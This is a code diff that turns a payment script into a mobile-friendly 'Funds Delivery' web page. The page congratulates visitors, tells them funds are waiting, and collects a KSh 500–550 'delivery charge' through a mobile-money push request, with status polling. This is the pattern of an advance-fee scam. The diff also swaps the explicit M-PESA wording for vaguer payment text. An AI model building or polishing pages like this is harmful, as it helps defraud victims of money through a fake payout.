@@ -1,4 +1,197 @@
-// ==========================================
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Funds Delivery</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+body{
+    font-family:Arial,sans-serif;
+    background:#f4f7f8;
+    color:#222;
+}
+
+.container{
+    width:92%;
+    max-width:480px;
+    margin:auto;
+}
+
+header{
+    background:#087f3e;
+    color:white;
+    padding:20px 0;
+}
+
+header h1{
+    font-size:22px;
+}
+
+.card{
+    background:white;
+    margin:18px 0;
+    padding:22px 20px;
+    border-radius:14px;
+    box-shadow:0 2px 10px rgba(0,0,0,.07);
+}
+
+.card h2{
+    font-size:22px;
+    margin-bottom:10px;
+}
+
+.card p{
+    color:#666;
+    line-height:1.5;
+    margin-bottom:20px;
+}
+
+.delivery-option{
+    display:block;
+    border:1px solid #ddd;
+    border-radius:10px;
+    padding:15px;
+    margin-bottom:12px;
+    cursor:pointer;
+}
+
+.delivery-option input{
+    margin-right:8px;
+}
+
+.method{
+    font-weight:700;
+}
+
+.fee{
+    color:#666;
+    font-size:14px;
+    margin-top:5px;
+}
+
+.selected-fee{
+    background:#f4f7f8;
+    padding:14px;
+    border-radius:10px;
+    margin:18px 0;
+}
+
+.btn{
+    width:100%;
+    padding:15px;
+    border:0;
+    border-radius:9px;
+    background:#087f3e;
+    color:white;
+    font-size:16px;
+    font-weight:700;
+    cursor:pointer;
+}
+
+.btn:disabled{
+    opacity:.6;
+    cursor:not-allowed;
+}
+
+#status{
+    text-align:center;
+    margin-top:15px;
+    font-size:14px;
+}
+
+footer{
+    text-align:center;
+    padding:25px 10px;
+    color:#777;
+    font-size:12px;
+}
+</style>
+</head>
+
+<body>
+
+<header>
+    <div class="container">
+        <h1>Funds Delivery</h1>
+    </div>
+</header>
+
+<main class="container">
+
+    <section class="card">
+
+        <h2>Congratulations!</h2>
+
+        <p>
+            Kindly choose where you would like your funds transferred.
+            Each delivery method has a small fee to cover applicable
+            network and processing charges.
+        </p>
+
+        <label class="delivery-option">
+            <input
+                type="radio"
+                name="delivery"
+                value="500"
+                onchange="updateFee()"
+            >
+
+            <span class="method">Mobile Money</span>
+
+            <div class="fee">
+                Delivery charge: KSh 500
+            </div>
+        </label>
+
+        <label class="delivery-option">
+            <input
+                type="radio"
+                name="delivery"
+                value="550"
+                onchange="updateFee()"
+            >
+
+            <span class="method">Bank Account</span>
+
+            <div class="fee">
+                Delivery charge: KSh 550
+            </div>
+        </label>
+
+        <div class="selected-fee">
+            Delivery Fee:
+            <strong>KSh <span id="deliveryFee">0</span></strong>
+        </div>
+
+        <button
+            type="button"
+            id="payButton"
+            class="btn"
+            onclick="payDelivery()"
+        >
+            Pay Delivery Charges
+        </button>
+
+        <div id="status"></div>
+
+    </section>
+
+</main>
+
+<footer>
+    Please review the selected delivery method and applicable charge
+    before making payment.
+</footer>
+
+<script>
 
 function updateFee(){
 
@@ -16,11 +209,6 @@ function updateFee(){
 
 }
 
-
-// ==========================================
-// PAY DELIVERY
-// ==========================================
-
 async function payDelivery(){
 
     const selected =
@@ -30,15 +218,13 @@ async function payDelivery(){
 
     if(!selected){
 
-        alert("Please select delivery method.");
+        alert("Please select a delivery method.");
 
         return;
     }
 
-
     const phone =
         localStorage.getItem("phoneNumber");
-
 
     if(!phone){
 
@@ -47,28 +233,20 @@ async function payDelivery(){
         return;
     }
 
-
     const amount =
         Number(selected.value);
-
 
     const status =
         document.getElementById("status");
 
-
     const button =
         document.getElementById("payButton");
 
-
     button.disabled = true;
-
-    button.innerText =
-        "Processing...";
-
+    button.innerText = "Processing...";
 
     status.innerText =
-        "Sending STK Push...";
-
+        "Sending payment request...";
 
     try{
 
@@ -89,30 +267,19 @@ async function payDelivery(){
                 }
             );
 
-
         const data =
             await response.json();
 
-
-        console.log(
-            "STK RESPONSE:",
-            data
-        );
-
+        console.log("PAYMENT RESPONSE:", data);
 
         if(!response.ok){
 
             throw new Error(
                 data.message ||
-                "STK Push failed"
+                "Payment request failed"
             );
 
         }
-
-
-        // ==================================
-        // GET PAYLOR TRANSACTION ID
-        // ==================================
 
         const transactionId =
             data.transactionId ||
@@ -120,13 +287,7 @@ async function payDelivery(){
             data.data?.transactionId ||
             data.data?.checkout_request_id;
 
-
         if(!transactionId){
-
-            console.error(
-                "No transaction ID found:",
-                data
-            );
 
             throw new Error(
                 "Payment reference was not returned."
@@ -134,72 +295,32 @@ async function payDelivery(){
 
         }
 
-
-        console.log(
-            "PAYMENT ID:",
-            transactionId
-        );
-
-
         status.innerText =
-            "📱 STK Push sent. Please enter your M-PESA PIN.";
-
-
-        // Start checking payment
+            "Payment request sent. Please follow the instructions on your phone.";
 
         checkPayment(transactionId);
 
-
     }catch(error){
 
-        console.error(
-            "STK ERROR:",
-            error
-        );
-
+        console.error("PAYMENT ERROR:", error);
 
         button.disabled = false;
-
         button.innerText =
             "Pay Delivery Charges";
 
-
         status.innerText =
-            "❌ Failed to send STK Push.";
+            "Payment request failed.";
 
     }
 
 }
 
-
-// ==========================================
-// CHECK PAYMENT STATUS
-// ==========================================
-
 function checkPayment(transactionId){
-
-    console.log(
-        "Checking payment:",
-        transactionId
-    );
-
 
     const interval =
         setInterval(async()=>{
 
             try{
-
-                // ==================================
-                // DEBUG TRANSACTION ID
-                // ==================================
-
-                console.log(
-                    "SENDING PAYMENT STATUS:",
-                    {
-                        transactionId: transactionId
-                    }
-                );
-
 
                 const response =
                     await fetch(
@@ -226,20 +347,13 @@ function checkPayment(transactionId){
                         }
                     );
 
-
                 const result =
                     await response.json();
-
 
                 console.log(
                     "PAYMENT STATUS:",
                     result
                 );
-
-
-                // ==================================
-                // GET PAYMENT STATUS
-                // ==================================
 
                 const paymentStatus =
                     String(
@@ -249,11 +363,6 @@ function checkPayment(transactionId){
                         ""
                     ).toLowerCase();
 
-
-                // ==================================
-                // COMPLETED
-                // ==================================
-
                 if(
                     paymentStatus === "completed" ||
                     paymentStatus === "success"
@@ -261,10 +370,8 @@ function checkPayment(transactionId){
 
                     clearInterval(interval);
 
-
                     document.getElementById("status").innerText =
-                        "✅ Delivery charges paid successfully.";
-
+                        "Payment confirmed successfully.";
 
                     setTimeout(()=>{
 
@@ -275,68 +382,31 @@ function checkPayment(transactionId){
 
                 }
 
-
-                // ==================================
-                // CANCELLED
-                // ==================================
-
                 else if(
-                    paymentStatus === "cancelled"
-                ){
-
-                    clearInterval(interval);
-
-
-                    document.getElementById("status").innerText =
-                        "❌ Payment cancelled.";
-
-
-                    document.getElementById("payButton").disabled =
-                        false;
-
-
-                    document.getElementById("payButton").innerText =
-                        "Pay Delivery Charges";
-
-                }
-
-
-                // ==================================
-                // FAILED
-                // ==================================
-
-                else if(
+                    paymentStatus === "cancelled" ||
                     paymentStatus === "failed"
                 ){
 
                     clearInterval(interval);
 
-
                     document.getElementById("status").innerText =
-                        "❌ Payment failed.";
+                        "Payment was not completed.";
 
+                    const button =
+                        document.getElementById("payButton");
 
-                    document.getElementById("payButton").disabled =
-                        false;
-
-
-                    document.getElementById("payButton").innerText =
+                    button.disabled = false;
+                    button.innerText =
                         "Pay Delivery Charges";
 
                 }
 
-
-                // ==================================
-                // PENDING
-                // ==================================
-
                 else{
 
                     document.getElementById("status").innerText =
-                        "⏳ Payment received. Confirming payment...";
+                        "Confirming payment...";
 
                 }
-
 
             }catch(error){
 
